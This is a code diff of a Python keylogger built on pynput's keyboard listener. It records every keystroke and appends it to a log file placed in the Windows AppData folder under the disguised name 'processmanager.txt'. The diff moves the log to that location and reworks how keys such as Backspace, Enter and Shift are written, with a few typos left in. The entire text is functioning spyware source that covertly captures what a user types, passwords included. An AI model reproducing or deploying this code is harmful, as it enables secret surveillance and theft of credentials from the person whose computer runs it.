@@ -6,8 +6,8 @@ from pynput.keyboard import Listener
 
 keys = []
 count = 0
-#path = os.environ['appdata'] + '\\processmanage.txt' #Windows
-path = 'processmanager.txt' #Linux
+path = os.environ['appdata'] + '\\processmanager.txt' #Windows
+#path = 'processmanager.txt' #Linux
 
 
 
@@ -28,25 +28,25 @@ def write_file(keys):
     with open(path, 'a') as f:
         for key in keys:
             k = str(key).replace("'", "")
-            if k.find('backspace') > 0:
-                f.write('Backspace')
+            if 'backspace' in k:
+                f.write('[Backspace]')
 
-            elif k.find('enter') > 0:
+            elif 'enter' in k:
                 f.write('\n')
 
-            elif k.find('shift') > 0:
-                f.write(' Shfit ')
+            elif 'shift' in k:
+                f.write('[Shfit]')
 
-            elif k.find('space') > 0:
+            elif 'space' in k:
                 f.write(' ')
             
-            elif k.find('caps_look') > 0:
-                f.write(' caps_lock ')
+            elif 'caps_look' in k:
+                f.write('[Caps_lock')
 
-            elif k.find('Key'):
+            elif 'key' not in k:
                 f.write(k)
 
 
 
-with Listener(on_press=on_press) as Listerner:
+with Listener(on_press=on_press) as Listener:
     Listener.join()
